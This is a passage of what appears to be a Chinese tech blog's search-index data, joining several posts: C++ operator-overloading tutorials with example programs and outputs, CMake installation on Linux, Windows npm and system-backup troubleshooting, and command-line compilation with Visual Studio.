operator+(Complex&amp; c1, Complex&amp; c2) { Complex c3(c1.a + c2.a, c1.b + c2.b); return c3;}int main() { Complex c1(1, 2), c2(3, 4); // 直接调用友元函数 Complex c3 = operator+(c1, c2); c3.print(); // 使用友元函数完成 "+" 运算符的重载 Complex c4 = c1 + c2; c4.print(); // 直接调用类成员函数 Complex c5 = c1.operator-(c2); c5.print(); // 使用类成员函数完成 "-" 运算符的重载 Complex c6 = c1 - c2; c6.print(); return 0;} 程序运行的输出结果如下： 1234a=4, b=6a=4, b=6a=-2, b=-2a=-2, b=-2 一元运算符重载在下述的案例中，演示了如何使用类成员函数和友元函数实现一元运算符的重载。值得一提的是，除了使用友元函数外，还可以使用全局函数（普通函数）来实现运算符的重载，不同的是使用友元函数更方便，可以直接访问类的所有私有（private）成员和保护（protected）成员。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;iostream&gt;using namespace std;class Complex {private: int a; int b;public: Complex(int a = 0, int b = 0) { this-&gt;a = a; this-&gt;b = b; } void print() { cout &lt;&lt; "a=" &lt;&lt; this-&gt;a &lt;&lt; ", b=" &lt;&lt; this-&gt;b &lt;&lt; endl; }public: // 使用类成员函数完成 "前置--" 运算符的重载 Complex&amp; operator--() { this-&gt;a--; this-&gt;b--; return *this; } // 使用类成员函数完成 "后置--" 运算符的重载 // 使用占位参数进行函数重载，是为了解决与 "前置--" 类成员函数冲突的问题 Complex operator--(int) { Complex tmp(this-&gt;a, this-&gt;b); this-&gt;a--; this-&gt;b--; return tmp; } // 声明用于 "前置++" 运算符重载的友元函数 friend Complex&amp; operator++(Complex&amp; c1); // 声明用于 "后置++" 运算符重载的友元函数 // 使用占位参数进行函数重载，是为了解决与 "前置++" 友元函数冲突的问题 friend Complex operator++(Complex&amp; c1, int);};// 定义友元函数完成 "前置++" 运算符的重载Complex&amp; operator++(Complex&amp; c1){ c1.a++; c1.b++; return c1;}// 定义友元函数完成 "后置++" 运算符的重载Complex operator++(Complex&amp; c1, int) { Complex tmp(c1.a, c1.b); c1.a++; c1.b++; return tmp;}int main() { Complex c1(1, 2), c2(8, 9), c3(15, 16), c4(24, 25); // 使用友元函数完成 "前置++" 运算符的重载 ++c1; c1.print(); // 使用类成员函数完成 "前置--" 运算符的重载 --c2; c2.print(); // 使用友元函数完成 "后置++" 运算符的重载 Complex c5 = c3++; c3.print(); c5.print(); // 使用类成员函数完成 "后置--" 运算符的重载 Complex c6 = c4--; c4.print(); c6.print(); return 0;} 程序运行的输出结果如下： 123456a=2, b=3a=7, b=8a=16, b=17a=15, b=16a=23, b=24a=24, b=25 左移运算符的重载值得一提的是，&lt;&lt; 左移运算符和 &gt;&gt; 右移运算符的重载，只能使用友元函数或者全局函数，不能使用类成员函数，这也是友元函数的重要作用之一。 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;using namespace std;class Complex {private: int a; int b;public: Complex(int a = 0, int b = 0) { this-&gt;a = a; this-&gt;b = b; }public: // 声明友元函数实现 "&lt;&lt;" 左移运算符的重载 friend ostream&amp; operator&lt;&lt;(ostream&amp; out, Complex&amp; c1);};// 定义友元函数实现 "&lt;&lt;" 左移运算符的重载ostream&amp; operator&lt;&lt;(ostream&amp; out, Complex&amp; c1) { out &lt;&lt; "a=" &lt;&lt; c1.a &lt;&lt; ", b=" &lt;&lt; c1.b &lt;&lt; endl; return out;}int main() { Complex c1(1, 2), c2(6, 9); cout &lt;&lt; c1 &lt;&lt; c2; return 0;} 程序运行的输出结果如下： 12a=1, b=2a=6, b=9 等号运算符的重载 = 运算符的结合性是从右到左 = 运算符的重载用于对象数据的复制 必须通过类成员函数重载 = 运算符，不能使用友元函数 = 运算符重载的函数原型为：类型 &amp; 类名 :: operator= ( const 类名 &amp; ) ; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;iostream&gt;#include "string.h"using namespace std;class Name {private: char* p; int len;public: Name(const char* name) { cout &lt;&lt; "有参构造函数被调用了" &lt;&lt; endl; len = strlen(name); p = new char[len + 1]; strcpy(p, name); } // 深拷贝的实现 Name(const Name&amp; name) { cout &lt;&lt; "拷贝构造函数被调用了" &lt;&lt; endl; len = name.getLen(); p = new char[len + 1]; strcpy(p, name.getP()); } ~Name() { cout &lt;&lt; "析构函数被调用了" &lt;&lt; endl; if (p != NULL) { delete[] p; p = NULL; len = 0; } } char* getP() const { return p; } int getLen() const { return len; }public: // 使用类成员函数实现 "=" 运算符的重载 Name&amp; operator=(const Name&amp; n) { // 释放内存空间 if (p != NULL) { delete[] p; p = NULL; len = 0; } // 重新分配内存空间 len = n.getLen(); p = new char[len + 1]; strcpy(p, n.getP()); return *this; }};int main() { Name obj1("Peter"); Name obj2("Tom"); Name obj4("Tim"); // 会自动调用拷贝构造函数（属于深拷贝） Name obj3 = obj1; cout &lt;&lt; "obj3.name: " &lt;&lt; obj3.getP() &lt;&lt; ", obj3.len: " &lt;&lt; obj3.getLen() &lt;&lt; endl; // 不会自动调用拷贝构造函数（属于浅拷贝） // 默认情况下，若这里不对 "=" 运算符进行重载，最终程序会异常终止运行（由于同一块内存空间被释放两次导致） obj4 = obj1; cout &lt;&lt; "obj4.name: " &lt;&lt; obj4.getP() &lt;&lt; ", obj4.len: " &lt;&lt; obj4.getLen() &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 12345678910有参构造函数被调用了有参构造函数被调用了有参构造函数被调用了拷贝构造函数被调用了obj3.name: Peter, obj3.len: 5obj4.name: Peter, obj4.len: 5析构函数被调用了析构函数被调用了析构函数被调用了析构函数被调用了 函数运算符的重载在下述的案例中，演示了如何使用类成员函数重载函数运算符 ()，值得一提的是，不能用友元函数重载函数运算符 ()。 12345678910111213141516#include &lt;iostream&gt;using namespace std;class Test {public: int operator()(int a, int b) { return a + b; }};int main() { Test test; cout &lt;&lt; test(3, 4) &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 17 运算符重载进阶为什么不要重载 &amp;&amp; 和 || 操作符 a) &amp;&amp; 和 || 是 C++ 中非常特殊的操作符 b) &amp;&amp; 和 || 内置实现了短路规则 c) 操作符重载是靠函数重载来完成的 d) 操作数作为函数参数传递 e) C++ 的函数参数都会被求值，无法实现短路规则 不同函数实现运算符重载的应用场景友元函数和类成员函数的选择方法： a) =、[]、() 和 -&gt; 运算符，只能通过类成员函数进行重载 b) 当无法修改左操作数的类时，只能通过友元函数进行重载，例如 &lt;&lt; 与 &gt;&gt; 运算符 友元函数重载 &lt;&lt; 与 &gt;&gt; 运算符： istream 和 ostream 是 C++ 的预定义流类 cin 是 istream 的对象，cout 是 ostream 的对象 运算符 &lt;&lt; 由 ostream 重载为插入操作，用于输出基本类型数据 运算符 &gt;&gt; 由 istream 重载为提取操作，用于输入基本类型数据 只能使用友元函数或者全局函数重载 &lt;&lt; 和 &gt;&gt; 运算符，输出和输入用户自定义的数据类型 类成员函数与友元函数实现运算符重载的步骤： a) 要承认运算符重载是一个函数，写出函数名称，如 operator +() b) 根据操作数，写出函数参数 c) 根据业务，完善函数的返回值（看函数是返回引用、指针还是元素），及实现函数业务；例如当函数的返回值充当左值时，需要返回一个引用 使用友元函数重载运算符的注意事项 a) 友元函数重载运算符常用于运算符的左右操作数类型不相同的场景 b) 在函数的第一个参数需要隐式转换的情形下，使用友元函数重载运算符是正确的选择 c) 友元函数没有 this 指针，所需操作数都必须在函数的参数表中显式声明，很容易实现类型的隐式转换 d) 在 C++ 中不能用友元函数重载的运算符分别有：=、[]、() 和 -&gt; e) 在 C++ 中不要重载 &amp;&amp; 和 || 运算符 f) C++ 的运算符重载遵循函数重载的规则 g) 除了重载运算符 &lt;&lt;、&gt;&gt; 必须使用友元函数之外，其他运算符的重载尽量都使用类成员函数，千万不要滥用友元函数，尤其类模板与友元函数一起使用的时候 运算符重载的综合使用案例重载自定义数组类的各种运算符在本案例中，自定义了数组类 Array，并使用类成员函数分别对 Array 类的 []、=、==、!= 运算符进行重载。 ★点击显示完整的案例代码★ Array.h 12345678910111213141516171819202122232425262728293031323334#pragma once#include &lt;iostream&gt;using namespace std;class Array {public: Array(int length); Array(const Array&amp; array); ~Array();public: int length();public: // 使用类成员函数重载 "[]" 数组下标运算符，用于数组元素的赋值和取值 int&amp; operator[](int index); // 使用类成员函数重载 "=" 运算符，用于数组之间的赋值 Array&amp; operator=(const Array&amp; array); // 使用类成员函数重载 "==" 运算符，判断两个数组是否相同 bool operator==(const Array &amp; array); // 使用类成员函数重载 "!=" 运算符，判断两个数组是否不相同 bool operator!=(const Array&amp; array);private: int m_length; int* m_space;}; Array.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include "Array.h"Array::Array(int length) { cout &lt;&lt; "有参构造函数被调用" &lt;&lt; endl; if (length &lt; 0) { length = 0; } this-&gt;m_length = length; this-&gt;m_space = new int[length];}Array::Array(const Array&amp; array) { cout &lt;&lt; "拷贝构造函数被调用" &lt;&lt; endl; // 深拷贝，单独分配内存空间 this-&gt;m_length = array.m_length; this-&gt;m_space = new int[array.m_length]; for (int i = 0; i &lt; array.m_length; i++) { this-&gt;m_space[i] = array.m_space[i]; }}Array::~Array() { cout &lt;&lt; "析构函数被调用" &lt;&lt; endl; if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; }}// 使用类成员函数重载 "[]" 数组下标运算符，用于数组元素的赋值和取值int&amp; Array::operator[](int index) { return this-&gt;m_space[index];}// 使用类成员函数重载 "=" 运算符，用于数组之间的赋值Array&amp; Array::operator=(const Array&amp; array) { if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; } // 深拷贝，单独分配内存空间 this-&gt;m_length = array.m_length; this-&gt;m_space = new int[array.m_length]; for (int i = 0; i &lt; array.m_length; i++) { this-&gt;m_space[i] = array.m_space[i]; } return *this;}// 使用类成员函数重载 "==" 运算符，判断两个数组是否相同bool Array::operator==(const Array&amp; array) { if (this-&gt;m_length != array.m_length) { return false; } for (int i = 0; i &lt; this-&gt;m_length; i++) { if (this-&gt;m_space[i] != array.m_space[i]) { return false; } } return true;}// 使用类成员函数重载 "!=" 运算符，判断两个数组是否不相同bool Array::operator!=(const Array&amp; array) { return !(*this == array);}int Array::length() { return this-&gt;m_length;} main.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include "Array.h"using namespace std;int main() { // 自动调用构造函数 Array array1(5); for (int i = 0; i &lt; array1.length(); i++) { array1[i] = i; } for (int i = 0; i &lt; array1.length(); i++) { cout &lt;&lt; "array1[" &lt;&lt; i &lt;&lt; "] = " &lt;&lt; array1[i] &lt;&lt; endl; } // 自动调用拷贝构造函数（属于深拷贝） Array array2 = array1; for (int i = 0; i &lt; array2.length(); i++) { cout &lt;&lt; "array2[" &lt;&lt; i &lt;&lt; "] = " &lt;&lt; array2[i] &lt;&lt; endl; } // 自动调用拷贝构造函数（属于深拷贝） Array array3 = array1; // 不会自动调用拷贝构造函数（属于浅拷贝） // 默认情况下，若这里不对 "=" 运算符进行重载，最终程序会异常终止运行（由于同一块内存空间被释放两次导致） array3 = array2; for (int i = 0; i &lt; array3.length(); i++) { cout &lt;&lt; "array3[" &lt;&lt; i &lt;&lt; "] = " &lt;&lt; array3[i] &lt;&lt; endl; } // 判断两个数组是否相同 bool result1 = array1 == array2; string strResult1 = result1 ? "=" : "!="; cout &lt;&lt; "array1 " &lt;&lt; strResult1 &lt;&lt; " array2 " &lt;&lt; endl; // 判断两个数组是否不相同 bool result2 = array1 != array2; string strResult2 = result2 ? "!=" : "="; cout &lt;&lt; "array1 " &lt;&lt; strResult2 &lt;&lt; " array2 " &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 1234567891011121314151617181920212223有参构造函数被调用array1[0] = 0array1[1] = 1array1[2] = 2array1[3] = 3array1[4] = 4拷贝构造函数被调用array2[0] = 0array2[1] = 1array2[2] = 2array2[3] = 3array2[4] = 4拷贝构造函数被调用array3[0] = 0array3[1] = 1array3[2] = 2array3[3] = 3array3[4] = 4array1 = array2array1 = array2析构函数被调用析构函数被调用析构函数被调用 重载自定义字符串类的各种运算符在本案例中，自定义了字符串类 MyString，并使用类成员函数和友元函数分别对 MyString 类的 []、=、==、!=、&gt;、&lt;、&gt;&gt;、&lt;&lt; 运算符进行重载。 ★点击显示完整的案例代码★ MyString.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#pragma once#include &lt;iostream&gt;#include "string.h"using namespace std;class MyString {public: MyString(); MyString(int len); MyString(const char* p); MyString(const MyString&amp; str);public: ~MyString();public: // 使用类成员函数重载 "[]" 运算符 char&amp; operator[](int index); // 使用类成员函数重载 "=" 运算符 MyString&amp; operator=(const char* p); MyString&amp; operator=(const MyString&amp; str); // 使用类成员函数重载 "==" 运算符 bool operator==(const char* p) const; bool operator==(const MyString str) const; // 使用类成员函数重载 "!=" 运算符 bool operator!=(const char* p) const; bool operator!=(const MyString str) const; // 使用类成员函数重载 "&gt;" 运算符 bool operator&gt;(const char* p) const; bool operator&gt;(const MyString str) const; // 使用类成员函数重载 "&lt;" 运算符 bool operator&lt;(const char* p) const; bool operator&lt;(const MyString str) const; // 使用友元函数重载 "&lt;&lt;" 运算符 friend ostream&amp; operator&lt;&lt;(ostream&amp; out, MyString&amp; str); // 使用友元函数重载 "&gt;&gt;" 运算符 friend iostream&amp; operator&gt;&gt;(iostream&amp; in, MyString&amp; str);public: int length(); char* c_str();private: int m_length; char* m_space;}; MyString.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166#include "MyString.h"// 无参构造函数MyString::MyString() { // 初始化为空字符串 this-&gt;m_length = 0; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, "");}// 有参构造函数MyString::MyString(int len) { if (len &lt; 0) { len = 0; } // 初始化为空字符串 this-&gt;m_length = len; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, "");}// 有参构造函数MyString::MyString(const char* p) { if (p == NULL) { // 初始化为空字符串 this-&gt;m_length = 0; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, ""); } else { this-&gt;m_length = strlen(p); this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, p); }}// 拷贝构造函数MyString::MyString(const MyString&amp; str) { // 深拷贝，重新分配内存空间 this-&gt;m_length = str.m_length; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, str.m_space);}// 析构函数MyString::~MyString() { // 释放内存空间 if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; }}// 使用类成员函数重载 "[]" 运算符char&amp; MyString::operator[](int index) { return this-&gt;m_space[index];}// 使用类成员函数重载 "=" 运算符MyString&amp; MyString::operator=(const char* p) { // 释放内存空间 if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; } // 深拷贝，重新分配内存空间 if (p == NULL) { // 初始化为空字符串 this-&gt;m_length = 0; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, ""); } else { this-&gt;m_length = strlen(p); this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, p); } return *this;}// 使用类成员函数重载 "=" 运算符MyString&amp; MyString::operator=(const MyString&amp; str) { // 释放内存空间 if (this-&gt;m_space != NULL) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_length = 0; } // 深拷贝，重新分配内存空间 this-&gt;m_length = str.m_length; this-&gt;m_space = new char[this-&gt;m_length + 1]; strcpy(this-&gt;m_space, str.m_space); return *this;}// 使用类成员函数重载 "==" 运算符bool MyString::operator==(const char* p) const { if (p == NULL) { if (this-&gt;m_length == 0) { return true; } return false; } if (this-&gt;m_length != strlen(p)) { return false; } return !strcmp(this-&gt;m_space, p);}bool MyString::operator==(const MyString str) const { if (this-&gt;m_length != str.m_length) { return false; } return !strcmp(this-&gt;m_space, str.m_space);}// 使用类成员函数重载 "!=" 运算符bool MyString::operator!=(const char* p) const { return !(*this == p);}bool MyString::operator!=(const MyString str) const { return !(*this == str);}// 使用类成员函数重载 "&gt;" 运算符bool MyString::operator&gt;(const char* p) const { return strcmp(p, this-&gt;m_space) &lt; 0;}bool MyString::operator&gt;(const MyString str) const { return strcmp(str.m_space, this-&gt;m_space) &lt; 0;}// 使用类成员函数重载 "&lt;" 运算符bool MyString::operator&lt;(const char* p) const { return strcmp(this-&gt;m_space, p) &lt; 0;}bool MyString::operator&lt;(const MyString str) const { return strcmp(this-&gt;m_space, str.m_space) &lt; 0;}// 使用友元函数重载 "&lt;&lt;" 运算符ostream&amp; operator&lt;&lt;(ostream&amp; out, MyString&amp; str) { out &lt;&lt; str.m_space; return out;}// 使用友元函数重载 "&gt;&gt;" 运算符iostream&amp; operator&gt;&gt;(iostream&amp; in, MyString&amp; str){ in &gt;&gt; str.m_space; return in;}int MyString::length(){ return this-&gt;m_length;}char* MyString::c_str() { return this-&gt;m_space;} main.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include "MyString.h"int main() { // 自动调用有参构造函数 MyString str1("Tom"); MyString str2(NULL); MyString str3("Peter"); // 自动调用拷贝构造函数 MyString str4 = str1; // 重载 "&lt;&lt;" 运算符 cout &lt;&lt; "str2 = " &lt;&lt; str2 &lt;&lt; endl; cout &lt;&lt; "str4 = " &lt;&lt; str4 &lt;&lt; endl; cout &lt;&lt; endl; // 不会自动调用拷贝构造函数（属于浅拷贝） // 重载 "=" 运算符，实现深拷贝 str4 = str3; cout &lt;&lt; "str4 = " &lt;&lt; str4 &lt;&lt; endl; str4 = "Jim"; cout &lt;&lt; "str4 = " &lt;&lt; str4 &lt;&lt; endl; str4 = NULL; cout &lt;&lt; "str4 = " &lt;&lt; str4 &lt;&lt; endl; cout &lt;&lt; endl; // 重载 "[]" 运算符 MyString str5("David"); str5[0] = \'F\'; cout &lt;&lt; "str5[0] = " &lt;&lt; str5[0] &lt;&lt; endl; cout &lt;&lt; "str5 = " &lt;&lt; str5 &lt;&lt; endl; cout &lt;&lt; endl; // 重载 "==" 运算符 MyString str6("Aaron"); MyString str7 = str6; cout &lt;&lt; str6 &lt;&lt; (str6 == str7 ? " = " : " != ") &lt;&lt; str7 &lt;&lt; endl; // 重载 "!=" 运算符 cout &lt;&lt; str6 &lt;&lt; (str6 != NULL ? " != " : " = ") &lt;&lt; " NULL" &lt;&lt; endl; cout &lt;&lt; endl; // 重载 "&lt;" 运算符 MyString str8("AAAA"); MyString str9("BBBB"); cout &lt;&lt; str8 &lt;&lt; (str8 &lt; str9 ? " &lt; " : " &gt; ") &lt;&lt; str9 &lt;&lt; endl; cout &lt;&lt; str8 &lt;&lt; (str8 &lt; "CCCC" ? " &lt; " : " &gt; ") &lt;&lt; "CCCC" &lt;&lt; endl; // 重载 "&gt;" 运算符 cout &lt;&lt; str9 &lt;&lt; (str9 &gt; str8 ? " &gt; " : " &lt; ") &lt;&lt; str8 &lt;&lt; endl; cout &lt;&lt; str9 &lt;&lt; (str9 &gt; "DDDD" ? " &gt; " : " &lt; ") &lt;&lt; "DDDD" &lt;&lt; endl; cout &lt;&lt; endl; // 重载 "&gt;&gt;" 运算符 MyString str11(5); cout &lt;&lt; "请输入长度为 5 的字符串：" &lt;&lt; endl; cin &gt;&gt; str11.c_str(); cout &lt;&lt; "str11 = " &lt;&lt; str11 &lt;&lt; endl; // MyString str4 = NULL; 此写法，会自动调用有参构造函数 `MyString(const char* p);` // MyString str1("AB"); // MyString str2 = str1; // str2 = NULL: 此写法，会自动调用 "=" 运算符重载的函数 `bool operator==(const char* p) const;` return 0;} 程序运行的输出结果如下： 123456789101112131415161718192021str2 =str4 = Tomstr4 = Peterstr4 = Jimstr4 =str5[0] = Fstr5 = FavidAaron = AaronAaron != NULLAAAA &lt; BBBBAAAA &lt; CCCCBBBB &gt; AAAABBBB &lt; DDDD请输入长度为 5 的字符串：abcdestr11 = abcde C++ 运算符和结合性的附录 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"CMake 入门教程之一 Linux 安装 CMake",url:"/posts/65d4f633.html",text:'Linux 安装 CMake3通过软件仓库安装 OpenSSL提示 在 Linux 系统上，安装 CMake3 的时候，一般需要提前安装 OpenSSL，尤其是使用源码编译的方式安装 CMake3 在 Linux 系统上，OpenSSL 通过源码编译安装的教程可以看这里 CentOS/Fedora 1# yum install -y openssl openssl-devel Debian/Ubuntu 1# apt-get -y install zlib1g zlib1g-dev libssl-dev 通过软件仓库安装 CMake3 CentOS/Fedora 12345# 添加EPEL源# yum install epel-release# 安装Cmake3# yum install -y cmake3 本地手动编译安装 CMake3提示 各版本的 CMake3 可以从 GitHub 仓库下载得到 CMake3 使用源码编译安装的方式，适用于绝大多数 Linux 发行版，例如：Debian/Ubuntu。 1234567891011121314151617181920212223242526# 下载文件# wget https://github.com/Kitware/CMake/releases/download/v3.21.0-rc1/cmake-3.21.0-rc1.tar.gz# 解压文件# tar -zxvf cmake-3.21.0-rc1.tar.gz# 进入解压目录# cd cmake-3.21.0-rc1# 构建# ./bootstrap# 编译# make -j4# 安装# make install# 创建软链接# ln -sf /usr/local/bin/cmake /usr/local/bin/cmake3# 查看版本号# cmake3 --version# 或者# cmake --version CMake 命令行编译代码1234567891011121314151617# 进入项目根目录# cd my_project# 创建构建目录# mkdir build# 进入构建目录# cd build# 生成makefile# cmake3 ..# 编译生成可执行文件# make# 运行可执行程序# ./my_project var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++ linux系统编程 c语言"},{title:"解决 Windows 系统使用 NPM 时遇到的各种问题",url:"/posts/b53b9a77.html",text:'pngquant-bin 模块安装失败 错误信息： 1234567891011npm ERR! path E:\\Workspaces_NodeJs\\hexo\\node_modules\\pngquant-binnpm ERR! command failednpm ERR! command C:\\WINDOWS\\system32\\cmd.exe /d /s /c node lib/install.jsnpm ERR! ‼ getaddrinfo ENOENT raw.githubusercontent.comnpm ERR! ‼ pngquant pre-build test failednpm ERR! i compiling from sourcenpm ERR! × ErroE: pngquant failed to build, make sure that libpng-dev is installednpm ERR! at E:\\Workspaces_NodeJs\\hexo\\node_modules\\bin-build\\node_modules\\execa\\index.js:231:11npm ERR! at runMicrotasks (&lt;anonymous&gt;)npm ERR! at processTicksAndRejections (node:internal/process/task_queues:96:5)npm ERR! at async Promise.all (index 0) 解决方法一：使用 系统管理员身份，在 Windows 系统上执行 npm install -g windows-build-tools 命令，安装系统缺失的编译工具，然后执行 npm install 命令安装需要的 NPM 模块 解决方法二（推荐）：使用 CNPM 替代 NPM，然后执行 cnpm install 命令安装需要的 NPM 模块 12# 安装CNPMnpm install -g cnpm --registry=https://registry.npmmirror.com 解决方法三（推荐）：在 Windows 系统上挂载 VPN，然后执行 npm install 命令安装需要的 NPM 模块，这可以从根本上解决国内访问 raw.githubusercontent.com 域名时被墙的问题 解决方法四：更改 Host 文件 C:\\Windows\\System32\\drivers\\etc\\hosts，在文件末尾添加以下内容，解决国内访问 raw.githubusercontent.com 域名时被墙的问题，然后执行 npm install 命令安装需要的 NPM 模块 1199.232.28.133 raw.githubusercontent.com var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"windows系统"},{title:"Windows 10 系统备份与还原常见错误解决",url:"/posts/490dddd2.html",text:'前言Windows 10 中的备份和还原（Windows 7）作为 Microsoft Windows 组件，继承了 Windows 7 的功能，该功能使您可以备份与恢复文件以及创建系统映像。如果在 Windows 的早期版本中使用 备份 和 还原 来备份文件或创建系统映像，则仍可以在 Windows 10 中恢复这些备份。此外，Windows 10 还包括另一个备份与恢复工具 - 文件历史记录，它只备份文档，音乐，图片，视频和桌面文件夹中文件的版本，以及 PC 上可用的 OneDrive 文件。如果要使用 文件历史记录 备份位于其他位置的其他文件，可以将其移至这些文件夹之一，然后再进行备份。保存备份的两个目标地址支持外部硬盘驱动器（例如 USB 闪存驱动器）和网络位置。 系统备份常见错误错误一错误提示信息无法创建卷影副本，请检查 vss 和 spp 应用程序事件日志更多信息（错误代码：0x81000019） 或者 由于内部错误，备份应用程序无法启动：卷影复制服务组件遇到意外错误（错误代码：0x80042302） 错误解决方案一这个错误可能是由于三方杀毒软件冲突或者一些 Windows 备份相关的服务被禁用导致的，具体解决步骤如下： a) 暂时关闭或卸载第三方杀毒软件 b) 使用快捷键 windows + r，输入 services.msc，打开服务控制台，并检查下列服务是否正常运行。如果服务被禁用，请将其启用，并将启动类型设置为 自动。 12345Volume Shadow Copy (VSS)Remote Procedure Call (RPCSS)COM+ Event System (eventsystem)System Event Notification Service (sens)Microsoft Software Shadow Copy Provider (SWPRV) c) 重启 Windows 10 系统，然后再次尝试执行系统备份 (adsbygoogle = window.adsbygoogle || []).push({}); 错误解决方案二 a) 使用快捷键 windows + r，输入 msconfig b) 点击 服务 标签卡，勾选 隐藏所有的 Microsoft 服务 ，然后点击全部禁用并应用 c) 点击 启动 标签卡，点击 打开任务管理器 d) 禁用全部开机启动项 e) 重启 Windows 10 系统，然后再次尝试执行系统备份 f) 系统成功备份后，重新启用在上面的步骤中禁用的服务和开机启动项，最后再次重启系统 错误二错误提示信息Windows 备份在源卷上创建共享保护点失败（错误代码：0×8078006B） 错误解决方案这个错误一般是由程序冲突引起的，目前排查出是 腾讯电脑管家 的设置问题导致，具体解决步骤如下： a) 打开 腾讯电脑管家 的 设置中心 b) 找到 实时防护 菜单下面的 其他安全提示，将 开启卷影备份 的勾选去掉 c) 如果上述设置仍然没办法解决问题，建议暂时关闭或卸载 腾讯电脑管家 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"windows系统"},{title:"Visual Studio 使用命令行编译 C/C++ 程序",url:"/posts/ab3ae9a.html",text:'VS 使用命令行编译单个 C/C++ 源文件在 Windows 系统的开始菜单栏里，找到 Developer Command Prompt for VS xxxx 应用程序，双击运行后，在 Command 窗口内执行以下命令来编单个 C/C++ 源文件。值得一提的是，这里需要将以下命令中的 HelloWorld 字符串替换为本地真正的 C/C++ 源文件的文件名。 12345678910111213141516171819# 查看文件列表&gt; dir2021/10/30 16:05 &lt;DIR&gt; .2021/10/30 16:05 &lt;DIR&gt; ..2021/10/30 22:15 601 HelloWorld.cpp# 编译C/C++源文件（cl后面字符的是小写L不是数字1）&gt; cl HelloWorld.cpp /EHsc# 查看文件列表，发现成功编译后会多了两个文件&gt; dir2021/10/30 16:53 &lt;DIR&gt; .2021/10/30 16:53 &lt;DIR&gt; ..2021/10/30 22:15 601 HelloWorld.cpp2021/10/30 16:53 101,888 HelloWorld.exe2021/10/30 16:53 1,976 HelloWorld.obj# 运行编译后的C/C++程序&gt; HelloWorld 或者 HelloWorld.exe VS 使用命令行编译多个 C/C++ 源文件假设项目里有如下的三个 C/C++ 源文件，分别是 Array.h、Array.cpp、main.cpp，那么编译这几个文件时就可以使用命令：cl main.cpp Array.cpp /EHsc。值得一提的是，编译命令里不需要指定以 .h 作为后缀的文件，只需要指定所有以 .c 或者 .cpp 作为后缀的文件即可。 Array.h 1234567891011121314151617181920212223#pragma once#include &lt;iostream&gt;using namespace std;class Array {public: Array(int length); Array(const Array&amp; array); ~Array();public: void setData(int index, int value); int getData(int index); int length();private: int m_length; int* m_space;}; Array.cpp 